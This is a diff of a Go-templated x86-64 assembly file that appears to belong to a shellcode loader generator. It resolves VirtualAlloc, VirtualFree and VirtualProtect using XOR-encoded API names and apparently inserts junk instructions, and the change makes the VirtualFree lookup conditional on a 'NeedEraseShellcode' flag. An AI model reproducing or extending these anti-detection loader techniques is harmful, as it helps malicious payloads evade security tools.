@@ -91,11 +91,11 @@ entry:
     mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}            {{igi}}
     xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
     push {{.RegV.rcx}}                                         {{igi}}
-    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
-    mov rdx, rsp             {{igi}} // lpProcName
-    sub rsp, 0x20            {{igi}} // reserve stack for call convention
-    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
-    add rsp, 0x20            {{igi}} // restore stack for call convention
+    mov rcx, {{.RegN.rsi}}     {{igi}} // hModule
+    mov rdx, rsp               {{igi}} // lpProcName
+    sub rsp, 0x20              {{igi}} // reserve stack for call convention
+    call {{.RegN.rbp}}         {{igi}} // call GetProcAddress
+    add rsp, 0x20              {{igi}} // restore stack for call convention
     // restore stack for procedure name
     add rsp, 2*8                                               {{igi}}
     // store procedure address to stack
@@ -108,30 +108,32 @@ entry:
   {{end}}
 
   // get procedure address of VirtualFree
-  {{if .LackVirtualFree}}
-    // push procedure name to stack
-    mov {{.RegV.rax}}, {{index .VirtualFreeDB  0}}             {{igi}}
-    mov {{.RegV.r8}},  {{index .VirtualFreeKey 0}}             {{igi}}
-    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
-    push {{.RegV.rax}}                                         {{igi}}
-    mov {{.RegV.rcx}}, {{index .VirtualFreeDB  1}}             {{igi}}
-    mov {{.RegV.r9}},  {{index .VirtualFreeKey 1}}             {{igi}}
-    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
-    push {{.RegV.rcx}}                                         {{igi}}
-    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
-    mov rdx, rsp             {{igi}} // lpProcName
-    sub rsp, 0x20            {{igi}} // reserve stack for call convention
-    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
-    add rsp, 0x20            {{igi}} // restore stack for call convention
-    // restore stack for procedure name
-    add rsp, 2*8                                               {{igi}}
-    // store procedure address to stack
-    mov [rsp+0x18], rax                                        {{igi}}
-  {{else}}
-    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{igi}}
-    add {{.RegV.rcx}}, {{hex .VirtualFree}}                    {{igi}}
-    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{igi}}
-    mov [rsp+0x18], {{.RegV.rcx}}                              {{igi}}
+  {{if .NeedEraseShellcode}}
+    {{if .LackVirtualFree}}
+      // push procedure name to stack
+      mov {{.RegV.rax}}, {{index .VirtualFreeDB  0}}           {{igi}}
+      mov {{.RegV.r8}},  {{index .VirtualFreeKey 0}}           {{igi}}
+      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{igi}}
+      push {{.RegV.rax}}                                       {{igi}}
+      mov {{.RegV.rcx}}, {{index .VirtualFreeDB  1}}           {{igi}}
+      mov {{.RegV.r9}},  {{index .VirtualFreeKey 1}}           {{igi}}
+      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{igi}}
+      push {{.RegV.rcx}}                                       {{igi}}
+      mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
+      mov rdx, rsp             {{igi}} // lpProcName
+      sub rsp, 0x20            {{igi}} // reserve stack for call convention
+      call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
+      add rsp, 0x20            {{igi}} // restore stack for call convention
+      // restore stack for procedure name
+      add rsp, 2*8                                             {{igi}}
+      // store procedure address to stack
+      mov [rsp+0x18], rax                                      {{igi}}
+    {{else}}
+      mov {{.RegV.rcx}}, {{.RegN.rdi}}                         {{igi}}
+      add {{.RegV.rcx}}, {{hex .VirtualFree}}                  {{igi}}
+      mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                       {{igi}}
+      mov [rsp+0x18], {{.RegV.rcx}}                            {{igi}}
+    {{end}}
   {{end}}
 
   // get procedure address of VirtualProtect
@@ -145,11 +147,11 @@ entry:
     mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}          {{igi}}
     xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
     push {{.RegV.rcx}}                                         {{igi}}
-    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
-    mov rdx, rsp             {{igi}} // lpProcName
-    sub rsp, 0x20            {{igi}} // reserve stack for call convention
-    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
-    add rsp, 0x20            {{igi}} // restore stack for call convention
+    mov rcx, {{.RegN.rsi}}     {{igi}} // hModule
+    mov rdx, rsp               {{igi}} // lpProcName
+    sub rsp, 0x20              {{igi}} // reserve stack for call convention
+    call {{.RegN.rbp}}         {{igi}} // call GetProcAddress
+    add rsp, 0x20              {{igi}} // restore stack for call convention
     // restore stack for procedure name
     add rsp, 2*8                                               {{igi}}
     // store procedure address to stack
